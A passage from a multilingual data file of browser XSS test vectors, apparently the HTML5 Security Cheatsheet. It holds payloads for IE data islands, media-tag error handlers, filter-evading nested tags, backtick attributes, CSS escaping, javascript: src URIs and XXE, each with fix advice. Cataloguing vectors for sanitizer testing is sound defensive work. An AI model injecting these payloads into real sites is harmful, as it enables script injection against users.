            'cs' : 'Internet Explorer podporuje Scriptlety jako alternativní metodu pro Data Islands. Užitím uvedeného příkladu bude JavaScript spuštěn bez uživatelské interakce.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx', 'http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.',
            'ja' : '',
            'ru' : 'Пользователи не должны иметь возможность добавлять стили или HTML, содержащиий атрибут style. Если такие возможности необходимы, убедитесь, что свойство behavior не занесено в белый список.',
            'cs' : 'Uživatelé by neměli mít možnost vložit CSS nebo HTML obsahující atributy stylu. Pokud je však použití stylů vyžadováno, ujistěte se, že "behavior" není uvedeno ve whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'behavior', 'scriptlet', 'internet explorer', 'style', 'css', 'sct'],
        'reporter'   : '.mario'
    },
    { /* ID 53 - Internet Explorer Data Islands executing JavaScript */
        'id'         : 53,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Internet Explorer Data Islands executing JavaScript',
            'ja' : '',
            'ru' : 'Исполнение JavaScript, используя островки XML-данных в Internet Explorer.',
            'cs' : 'JavaScript v Data Islands Internet Exploreru',
            'de' : ''
        },
        'data'       : '<xml id="xss" src="%htc_path%"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '0',            
            'path'          : 'http://html5sec.org/test.htc',
            'name'          : 'test.htc',
            'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
        },        
        'description': {
            'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
            'ja' : '',
            'ru' : 'В данном примере тег <XML> используется для вынесения опасного кода во внешний источник. В теге <LABEL> часть этого кода, ограниченная тегом <payload>, связывается с HTML и затем автоматически выполняется.',
            'cs' : 'Internet Explorer podporuje Data Islads jako metodu XML. Užitím uvedeného příkladu bude JavaScript spuštěn bez uživatelské interakce.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Users should not be able to submit HTML containing <XML> tags. If necessary make sure the "dataformatas" and "datasrc" attributes are not whitelisted.',
            'ja' : '',
            'ru' : 'Пользователи не должны иметь возможность внедрять разметку, содержащую тег <XML>. Дополнительно убедитесь, что атрибуты dataformatas и datasrc не занесены в белый список.',
            'cs' : 'Uživatelé by neměli mít možnost vložit HTML obsahující tag <XML>. Pokud je však jaho použití vyžadováno, ujistěte se, že "dataformatas" a "datasrc" nejsou uvedeny ve whitelistu.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'behavior', 'internet explorer', 'style', 'css', 'data island'],
        'reporter'   : '.mario'
    },
    { /* ID 54 - Self-hijacking JSON literals */
        'id'         : 54,
        'category'   : 'json', 
        'name'       : {
            'en' : 'Self-hijacking JSON literals',
            'ja' : '',
            'ru' : 'Самозахватывающий JSON-литерал',
            'cs' : 'Self-hijacking textového řetězce JSON',
            'de' : ''
        },
        'data'       : '<script>[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]</script>',
        'description': {
            'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
            'ja' : '',
            'ru' : 'Даже в случае, если часть JSON-литерала будет подконтрольна пользовательскому вводу, существует риск автоматического получения значений в т.ч. последующих членов объекта.',
            'cs' : 'Pokud jsou textové řetězce vložené uživatelem součástí JSON řetězců, představuje znak apostrofu \' bezpečnostní riziko.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.0', '10.10', 'end', 'mobile'],
            'chrome': ['4.0', '5.0', '6.0', 'end'],
            'firefox': ['1.x', '2.0', '3.0', '3.0.19', 'end']
        },
        'tags'       : ['xss', 'javascript', 'json', '__definesetter__', 'object', 'prototype'],
        'reporter'   : '.mario'
    },
    { /* ID 55 - JavaScript execution via <VIDEO> and <SOURCE> tag (1) */
        'id'         : 55,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag (1)',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью тегов <VIDEO> и <SOURCE> (1)',
            'cs' : 'Spuštění JavaScriptu prostřednictvím tagů <VIDEO> a <SOURCE> (1)',
            'de' : ''
        },
        'data'       : '<video><source onerror="%js_alert%">',
        'description': {
            'en' : 'Opera 10.5+ and Chrome allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags',
            'ja' : '',
            'ru' : 'Вектор демонстрирует возможность вызова события error в теге <SOURCE>, инкапсулируемом тегом <VIDEO> в браузерах Opera 10.5+ и Chrome. Сказанное действительно и для тега <AUDIO>.',
            'cs' : 'Opera 10.5+ a Chrome umožňují definovat obsluhu události error u tagu <SOURCE>, pokud je zapouzdřen v prvku <VIDEO>. Uvedené platí i pro tag <AUDIO>.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted <SOURCE> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательский тег <SOURCE> не может содержать обработчики событий.',
            'cs' : 'Ujistěte se, že není povoleno vkládat tagy <SOURCE>. Pokud je použití těchto tagů vyžadováno, měly by být whitelistem povoleny jen nezbytné prvky uživatelského rozhraní.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.5', '11.0', '12.0'],
            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '25.0'],
            'firefox': ['4.0', '15.0']
        },
        'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'opera', 'chrome', 'audio'],
        'reporter'   : '.mario'
    },
    { /* ID 56 - JavaScript execution via <VIDEO> and <SOURCE> tag (2) */
        'id'         : 56,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag (2)',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью тегов <VIDEO> и <SOURCE> (2)',
            'cs' : 'Spuštění JavaScriptu prostřednictvím tagů <VIDEO> a <SOURCE> (2)',
            'de' : ''
        },
        'data'       : '<video onerror="%js_alert%"><source></source></video>',
        'description': {
            'en' : 'Firefox 3.5+ allows error handlers in <VIDEO> tags when applied with a <SOURCE> tag. The same works for <AUDIO> tags.\r\n\r\nOn Firefox 4+ the <SOURCE> tag is irrelevant to trigger the error event. This happens because of the implicit "src" attribute in <VIDEO> tag when the page has a number sign (#) in the URL.',
            'ja' : '',
            'ru' : 'Firefox 3.5+ запускает обработчик события в теге <video>, используемом совместно с тегом <source>. То же самое для тега <audio>.\r\n\r\nВ Firefox 4+ тег <source> не имеет значения для срабатывания onerror, который происходит из-за значения подразумеваемого атрибута src в теге <video>. Для срабабывания обработчика необходим знак номера (#) в адресе страницы.',
            'cs' : 'Firefox 3.5+ umožňuje definovat obsluhu události error v tagu <VIDEO>, pokud je aplikován společně s tagem <SOURCE>. Uvedené platí i pro tag <AUDIO>.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted <AUDIO> and <VIDEO> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательские теги <AUDIO> и <VIDEO> не могут содержать обработчики событий.',
            'cs' : 'Ujistěte se, že vložené tagy <AUDIO> a <VIDEO> nemohou obsahovat ovladače událostí nebo jen ty, které jsou uvedeny ve whitelistu, protože jsou nezbytné pro prvků uživatelského rozhraní.',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.5', '3.6', '4.0', '15.0'], 
            'internet explorer' :  ['9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'firefox', 'audio'],
        'reporter'   : '.mario'
    },
    { /* ID 57 - Tags nested in other tags */
        'id'         : 57,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Tags nested in other tags to trick filters',
            'ja' : '',
            'ru' : 'Вложенные теги как способ обхода фильтров',
            'cs' : 'Tagy vložené do jiných tagů pro oklamání bezpečnostních filtrů',
            'de' : ''
        },
        'data'       : '<b <script>%js_alert%//</script>0</script></b>',
        'description': {
            'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
            'ja' : '',
            'ru' : 'Использование вложенных тегов (тегов, которые закрываются открытием других тегов, при этом оставаясь взаимо функционирующими) разрешено в Chrome, Firefox и Safari указанных версий. При этом в каждом из браузеров вложенные теги имеют/имели свои особенности. Так, например, только Safari позволяет зактыть пустой закрывающий тег вложенным (</ <script>...).',
            'cs' : 'Chrome, Firefox a Safari spustí JavaScript z příkladu, zatímco IE a Opera ne.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'This vector is ideal to trick regular expression based HTML filters and sanitizers. Make sure your filters are aware of the fact that some user agents evaluate <b <script> while others will prefer <b><script>.',
            'ja' : '',
            'ru' : 'Данный вектор идеален при обходе регулярных выражений HTML-фильтров. Убедитесь, что ваши фильтры учитывают тот факт, что некоторые пользовательские агенты рассматривают вложенные теги в качестве самосоятельных тегов.',
            'cs' : 'Tento vektor je ideální k oklamání HTML filtrů založených na regulárních výrazech. Ujistěte se, že vaše bezpečnostní filtry počítají se skutečností, že některé webové prohlížeče vyhodnotí kód <b <script> jako <b> <script>.',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.5', '3.6', '3.6.28', 'end'],
            'chrome': ['4.0', '5.0', 'end'],
            'safari': ['3.0', '4.0', '4.0.3', 'end']
        },
        'tags'       : ['xss', 'javascript', 'nesting', 'script', 'parser', 'regex'],
        'reporter'   : '.mario, Kyo, sirdarckcat'
    },
    { /* ID 58 - E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time */
        'id'         : 58,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
            'ja' : '',
            'ru' : 'Использование E4X для одновременного закрытия дескрипторов и создания объекта.',
            'cs' : 'E4X použitý k uzavření otevřeného tagu <SCRIPT> vytvořením nového E4X objektu.',
            'de' : ''
        },
        'data'       : '<b><script<b></b><%js_alert%</script </b></b>',
        'description': {
            'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
            'ja' : '',
            'ru' : 'В данном примере показано, что Firefox позволяет закрывать дескриптор, создавая при этом новый E4X-объект (<b></b>). В дальнейшем этот объект дополнительно сравнивается оператором < с результатом вызова функции alert - таким образом обеспечивается выполнение JavaScript.',
            'cs' : 'Toto je ošidné. Firefox umožňuje dokonce použít otevírací tag <SCRIPT> s novým objektem E4X (<b/>) vytvořeným současně v rámci JavaScriptu. Alert může být spuštěn proto, že dodatečná otevírací lomená závorka (<) je chápána jako znak porovnání velikosti (<b/> <varování (1)).',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.0', '3.0', '3.6.28', 'end']
        },
        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
        'reporter'   : '.mario'
    },
    { /* ID 59 - XSS using accent grave when copying innerHTML (1) */
        'id'         : 59,
        'category'   : 'html', 
        'name'       : {
            'en' : 'XSS using accent grave when copying innerHTML (1)',
            'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
            'ru' : 'XSS, используя обратные апострофы при копировании с помощью innerHTML (1)',
            'cs' : 'XSS užitím znaku accent grave během kopírování innerHTML (1)',
            'de' : ''
        },
        'data'       : '<div id="div1"><input value="``onmouseover=%js_alert%"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
        'description': {
			'en' : 'Internet Explorer treats the accent grave (`) as an attribute delimiter like \" and \'. The quotation mark (") will be stripped from the attribute value when using the innerHTML property in case it doesn\'t contain space.',
            'ja' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
            'ru' : 'Пример наглядно показывает, как при копировании разметки с помощью innerHTML браузер Internet Explorer убирает ограничитель параметра value (в приведенном примере - "), если он не содержит пробельных символов. При этом происходит выход за пределы первоначального параметра, приводящий к исполнению JavaScript при последующей вставке кода.',
            'cs' : 'Internet Explorer vnímá znak accent grave (`) stejně jako apostrof \' nebo uvozovky \", čili jako oddělovač. V případě, že neobsahují vloženou hodnotu, budou při použití vlastnosti innerHTML vypuštěny.',
            'de' : ''
        },
        'urls'    : ['#97','#98', '#128'],
        'howtofix'   : {
            'en' : 'Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja). Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it\'s supposed to.',
            'ja' : '',
            'ru' : 'Убедитесь, что HTML-фильтр, который вы используете, рассматривает обратные апострофы в качестве ограничителя атрибута для IE и исходит из этого особенно тогда, когда пользователю разрешено использовать безопасный JavaScript (JSReg, Google Caja).',
            'cs' : 'Ujistěte se, že váš HTML filter si je vědom skutečnosti, že IE vnímá znak accent grave (`) jako oddělovač - zvláště pokud mají uživatelé povoleno psát neškodné JavaScripty (JSReg, Google Caja). Buďte také velmi opatrní při manipulaci s objekty DOM, jejichž HTML kód je generovaný ze strany uživatelů. Vlastnost innerHTML nemusí vždy obsahovat původní kód.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
        'reporter'   : 'hasegawayosuke'
    },
    { /* ID 60 - Obfuscation css-properties and values via ignored extra characters */
        'id'         : 60,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Obfuscation css-properties and values via ignored extra characters',
            'ja' : '',
            'ru' : 'Обфускация css-свойств и значений с помощью игнорируемых дополнительных символов',
            'cs' : 'Oklamání CSS vlastností a hodnot ignorováním speciálních znaků',
            'de' : ''
        },
        'data'       : '<div style="[a]color[b]:[c]red">XXX</div>',
        'trigger': 'fuzz(document.getElementsByTagName("div")[0], "style", ["[a]","[b]","[c]"], function(e, v){if(e.style.color=="red"){pass(v)}else{fail(v)});',
        'description': {
            'en' : '[a] Extra characters* ignored before property names (excluding backslash (92) and null character (0))\n\nFirefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer**, Opera: 123***\nFirefox 3.x, Internet Explorer**: 8\nInternet Explorer**: 1-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer**: CSS-strings\n\n[b] Extra characters ignored between property names and colon.\n\nFirefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer**: 11\nInternet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red)\n\n[c] Extra characters ignored before values\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n* These are given in decimal codes.\n** Up to IE 7 standards mode.\n*** Ignored only before first property names.',
            'ja' : '',
            'ru' : '[a] Дополнительные символы*, игнорируемые до имени свойства (за исключением обратного слеша (92) и нулевого символа (0))\n\nFirefox, Internet Explorer (любые режимы), Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer**, Opera: 123***\nFirefox 3.x, Internet Explorer**: 8\nInternet Explorer**: 1-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer**: CSS-строки\n\n[b] Дополнительные символы, игнорируемые между именем свойства и двоеточием.\n\nFirefox, Internet Explorer (любые режимы), Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer**: 11\nInternet Explorer (режим совместимости (quirks)): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (режим совместимости (quirks)): CSS-строки, буквенно-цифровые последовательности после небуквенно-цифровых символов (color,foo:red)\n\n[c] Дополнительные символы, игнорируемые перед значениями.\n\nFirefox, Internet Explorer (любые режимы), Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer**: 11,160,8192-8203,12288,65279\n\n* Приведены десятичные коды соответствующих символов.\n** Вплоть до режима стандартов IE 7.\n*** Игнорируется только перед первым именем свойства.',
            'cs' : '[a] Speciální znaky* ignorované před názvem vlastnosti (s výjimkou zpětného lomítka (92) a nulového znaku (0))\n\nFirefox, Internet Explorer (některé verze), Safari, Google Chrome, Opera: 9,10,12,13,32\nFirefox, Internet Explorer**, Opera: 123***\nFirefox 3.x, Internet Explorer**: 8\nInternet Explorer**: 1-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer**: CSS-řetězce\n\n[b] Speciální znaky ignorované mezi názvem vlastnosti a dvojtečkou.\n\nFirefox, Internet Explorer (některé verze), Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer**: 11\nInternet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (quirks mode): CSS-řetězce, alfanumerické znaky po nealfanumerických znacích (color,foo:red)\n\n[c] Speciální znaky ignorovné před hodnotou\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n* Uvedeno v desítkové soustavě.\n** S vyjímkou režimu kompatibility s IE8+.\n*** Ignorovány pouze před prvním výskytem názvu vlastnosti.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['2.x', '3.0', '4.0', '15.0'],
            'opera': ['9.x', '10.0', '11.0', '12.0', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0'],
            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing', 'quirks mode'],
        'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sirdarckcat'
    },
    { /* ID 61 - CSS-encoding and escaping */
        'id'         : 61,
        'category'   : 'css', 
        'name'       : {
            'en' : 'CSS encoding and escaping',
            'ja' : '',
            'ru' : 'CSS-кодирование и добавление обратного слеша',
            'cs' : 'Kódování a escapování znaků v CSS',
            'de' : ''
        },
        'data'       : '<div  style="\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;">XXX</div>',
        'trigger'    : 'document.getElementsByTagName("div")[0].style.color=="red"?pass():fail();',
        'description': {
            'en' : '[a] Encoding.\n\nThere are only three tricks to encode characters.\n[1] You can change the number of zeros: \\0A -> \\00000A \n[2] You can change the capital letter: \\0A -> \\0a \n[3] You can change the whitespace* accepted as delimiters after the encoded character.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,13,32\nInternet Explorer (IE7↓ Standards mode): 11,160,8192-8203,12288,65279\n\nProperties in IE7↓ Standards mode may contain encoded null-character (\\0).\nOn Opera and in IE8+ Standards mode encoded null-character cuts off the right side of a CSS structure.\nThe volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation.\n\n[b] Escaping.\n\nIn addition, you can put a backslash before the character.\nOption of writing a null-character in Internet Explorer 7↓ Standards mode is escaping of any whitespace-character accepted as delimiters: col\\&#160or:red \nIn IE quirks mode inside the url() function a backslash can be treated as equivalent of a slash and thus will not have the escape role.\n\nOf course, these methods can be combined with other encoding and obfuscation (for example, change case of original characters).\n\n* These are given in decimal codes.',
            'ja' : '',
            'ru' : '[a] Кодирование.\n\nСуществуют всего три приёма, которые можно использовать при CSS-кодировании.\n[1] Вы можете изменять число нулей: \\0A -> \\00000A \n [2] Вы можете менять регистр символов: \\0A -> \\0a \n [3] Вы можете менять пробельный символ*, рассматриваемый в качестве разделителя, после закодированного символа.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,13,32\nInternet Explorer (режим стандартов IE7↓): 11,160,8192-8203,12288,65279\n\n Свойства в режиме стандартов IE 7↓  могут содержать закодированный нулевой символ (\\0).\nТакой же нулевой символ, поставленный в Opera и в режиме стандартов IE8+ в конце CSS-структуры (напр., свойства или значения), отсекает её правую часть.\nВажно также помнить, что объем возможного CSS-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации.\n\n[b] Эскейпинг.\n\nКроме того, вы можете добавлять перед символами обратные слеши.\n Эскейпирование любого пробельного символа, рассматриваемого в качестве разделителя при CSS-кодировании, является вариантом написания нулевого символа для режима стандартов IE7↓: col\\&#160or:red \nВ IE, который находится в quirks mode, обратные слеши в функции url() могут рассматриваться в качестве обычных слешей (т.е. являться как бы частью пути), и поэтому не будут выполнять роль эскейпа.\n\nРазумеется, можно сочетать эти приемы с другим кодированием и обфускацией (например, с изменением регистра первоначальных символов).\n\n* Ниже они приведены в десятичных кодах.',
            'cs' : '[a] Kódování.\n\nJsou pouze tři triky pro kódování znaků.\n[1] Je možné měnit počet nul: \\0A -> \\00000A \n[2] Je možné měnit velikost písmen: \\0A -> \\0a \n[3] Je možné změnit bílý znak* akceptovaný jako oddělovač po zakódovaném znaku.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,13,32\nInternet Explorer (IE 7-): 11,160,8192-8203,12288,65279\n\nVlastnosti v IE 7- mohou obsahovat zakódovaný nulový znak (\\0).\nMnožství použitelných kódování se liší od použitého prohlížeče. Například, FF nemůže kódovat závorky, které jsou součástí zápisu funkce.\n\n[b] Escapování.\n\nKromě toho můžete dát zpětné lomítko i před písmeno.\nMožnost zápisu nulového znaku v Internet Exploreru je escapování nějakého jiného bílého znaku, který je akceptován jako oddělovač: col\\&#160or:red \n\nSamozřejmě je možné tyto metody kombinovat i s jinými způsoby kódování (například změnou velikosti originálních znaků).\n\n* Hodnoty jsou uvedeny v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.0', '3.0', '4.0', '13.0'],
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
            'chrome': ['7.0', '23.0'],
            'safari': ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
        'reporter'   : 'Gareth, LeverOne, Renaud Lifchitz, .mario'
    },
    { /* ID 62 - Simulating attribute in IE */
        'id'         : 62,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Simulating attribute in IE',
            'ja' : '',
            'ru' : 'Симуляция атрибута в IE',
            'cs' : 'Simulace atributů v IE',
            'de' : ''
        },
        'data'       : '<!-- IE 6-8 -->\r\n<x \'="foo"><x foo=\'><img src=x onerror=%js_alert%//\'>\r\n\r\n<!-- IE 6-9 -->\r\n<! \'="foo"><x foo=\'><img src=x onerror=%js_alert_2%//\'>\r\n<? \'="foo"><x foo=\'><img src=x onerror=%js_alert_3%//\'>',
        'description': {
            'en' : 'This vector is simulated using in IE a single quote as an attribute to trick filters, works up to IE 9 standards mode.',
            'ja' : '',
            'ru' : 'Этот вектор симулирует использование в IE одиночной кавычки в качестве атрибута, чтобы обмануть фильтры. Работает вплоть до режима стандартов IE 9.',
            'cs' : 'Tento vektor předstírá v IE vložení atributu užitím apostrofů. Používá se pro oklamaní bezpečnostních filtrů.',
            'de' : ''
        },
        'urls'    : ['#102', '#108', '#133'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'attribute', 'simulating', 'parser', 'regex'],
        'reporter'   : 'Algol, jackmasa, LeverOne, White Jordan'
    },    
	{ /* ID 63 - JavaScript execution via src attribute */
        'id'         : 63,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via src attribute',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью атрибута src',
            'cs' : 'Spuštění JavaScriptu prostřednictvím atributu src',
            'de' : ''
        },
        'data'       : '<embed src="%js_uri_alert%"></embed> // O10.10↓, OM10.0↓, GC6↓, FF\r\n<img src="%js_uri_alert_2%">\r\n<image src="%js_uri_alert_2%"> // IE6, O10.10↓, OM10.0↓\r\n<script src="%js_uri_alert_3%"></script> // IE6, O11.01↓, OM10.1↓',
        'description': {
            'en' : 'Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.',
            'ja' : '',
            'ru' : 'Большинство браузеров поддерживают псевдоскипт в атрибуте src тега <IFRAME> - и это ожидаемое поведение. Кроме того, некоторые их них могут исполнять JavaScript в атрибуте SRC также других тегов - однако такие возможности имеют тенденцию к снижению. В Opera 10.5+ уже не поддерживается псевдоскрипт в тегах <IMG> и <EMBED>.  ',
            'cs' : 'Mnoho webových prohlížečů umožňuje spuštění JavaScriptu prostřednictvím atributu "src" u tagu <IFRAME>, což je očeknáné chování. Zajímavé ovšem je, že může být tohoto způsobu použito také u jiných tagů. Opera 10, Chrome a Firefox spustí JavaScript v tagu <EMBED>. Opera 10 a Opera Mobile spustí JavaScript v atributu "src" také u tagů <SCRIPT>, <IMG> a <IMAGE> stejně jako starší verze Internet Exploreru.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure "src" attributes can never contain non-HTTP-URLs to prevent XSS or worse.',
            'ja' : '',
            'ru' : 'Убедитесь, что атрибут src пользовательской разметки не может содержать URL, не начинающийся "http://".',
            'cs' : 'V rámci prevence před XSS se ujistěte, že není možné u atributů "src" vložit URL používající jiný protokol než HTTP://',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.0', '4.0', '15.0'],
            'chrome': ['4.0', '5.0', '6.0', 'end'],
            'opera': ['8.x', '9.0', '10.0', '11.01', 'end', 'mobile 10.00', 'mobile 10.10', 'end'],
            'internet explorer': ['6.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'src', 'safari', 'chrome', 'opera', 'firefox', 'internet explorer'],
        'reporter'   : '.mario'
    },    
    { /* ID 64 - Arbitrary payload injection via XML External Entities (XXE) */
        'id'         : 64,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection via XML External Entities (XXE)',
            'ja' : '',
            'ru' : 'Инъекция удаленного кода через внешний XML-эквивалент.',
            'cs' : 'Vložení libovolného payloadu skrz XML Externí Entity (XXE)',
            'de' : ''
        },
        'data'       : '<!DOCTYPE x[<!ENTITY x SYSTEM "%xxe_path%">]><y>&x;</y>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '0',            
            'path'          : 'http://html5sec.org/test.xxe',
            'name'          : 'test.xxe',
            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
        },
        'description': {
            'en' : 'Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML. Note that the absolute URL for the source of XXE is required.',
